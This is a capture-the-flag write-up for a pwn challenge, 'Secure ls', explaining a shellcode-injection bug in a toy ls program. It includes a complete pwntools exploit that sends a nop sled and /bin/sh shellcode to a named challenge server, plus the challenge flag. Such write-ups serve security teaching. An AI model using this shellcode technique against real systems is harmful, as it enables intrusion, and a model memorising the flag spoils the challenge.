# Secure ls

## Challenge

The program is a simple version of the `ls` utility.

We are allowed to pass 0 or 1 options to the program under normal conditions.
These options are restricted to `-a` and `-l`.

The program will then print a list of files/directories in the current working directory.
Depending on our options, this may or may not include dotfiles and may or may not be in a list.

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

## Solution

Notably, NX is disabled and there are RWX segments, which is unusual for modern binaries.

If we look at the `err` macro, we can see that it simply calls its argument as a function.
The macro is being used to execute code in the buffer at a random offset if the `l` option is
included.

We can pass the `arglen` check in `main` by adding a null byte to our input after our options.
We need to include both options to satisfy `arglen == 3`, as normally the third character would be a
newline, however we cannot include one as this would end our input.

After the null byte, we can include around 256 null bytes.
This nopsled ensures that the code executed by the macro will eventually reach our shellcode.
After the nopsled, we can write a standard `execve("/bin/sh", NULL, NULL)` shellcode on the buffer.

The program will begin executing code on the nopsled, which will lead it to our shellcode.
This will spawn a shell which we can use to read the flag.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host srv3.momandpopsflags.ca --port 8754 lS
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('lS')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'srv3.momandpopsflags.ca'
port = int(args.PORT or 8754)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX disabled
# PIE:      PIE enabled
# RWX:      Has RWX segments

io = start()

payload = flat({
    0x0: b'-al\0',
    0x100: asm(shellcraft.sh()),
    }, filler=asm(shellcraft.nop()))
io.sendlineafter(b"Enter flags you would like to use with lS: ", payload)

io.interactive()
```

## Flag

```
magpie{sh3llc0d3_b3_sl1pp1n}
```
